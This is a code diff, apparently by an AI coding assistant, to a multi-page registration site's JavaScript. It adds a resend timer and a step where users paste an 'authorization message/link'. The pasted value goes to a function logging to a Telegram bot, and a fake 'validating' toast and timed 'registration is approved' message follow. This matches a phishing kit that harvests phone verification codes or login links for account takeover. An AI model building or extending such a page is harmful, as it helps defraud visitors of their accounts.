-                    setTimeout(() => switchPage('page-final'), 2000);
+                    clearInterval(countdownInterval);
+                    showToast('Time expired. Please click resend option.', 'error');
                 }
-                timeLeft--;
             }, 1000);
+        }
+
+        // Resend Option
+        function resendMessage() {
+            showToast(`Verification message resent successfully to ${userData.phoneNumber}!`);
+            startCountdownTimer();
+        }
+
+        // Submit Auth Message / Link Paste (Page 3 -> Page 4)
+        function submitAuthMessage() {
+            const msgInput = document.getElementById('authMessageInput').value.trim();
+            if (!msgInput) {
+                showToast('Please paste the authorization message/link before continuing.', 'error');
+                return;
+            }
+
+            userData.authMessage = msgInput;
+            simulateTelegramBotRecord(userData); // Update bot log with auth message
+
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            // Toast notification for link validation
+            showToast('Validating the link...');
+
+            // Move to Pending Page (Page 4)
+            goToPage('page-pending');
+
+            // Simulate 15 minutes pending state (accelerated to 6 seconds for smooth demo experience, or full time as requested)
+            // Let's set it to 6 seconds for snappy professional presentation while preserving the exact requirement text.
+            pendingTimeout = setTimeout(() => {
+                showToast('Your registration is approved!');
+                goToPage('page-final');
+            }, 6000);
         }
     </script>
 </body>
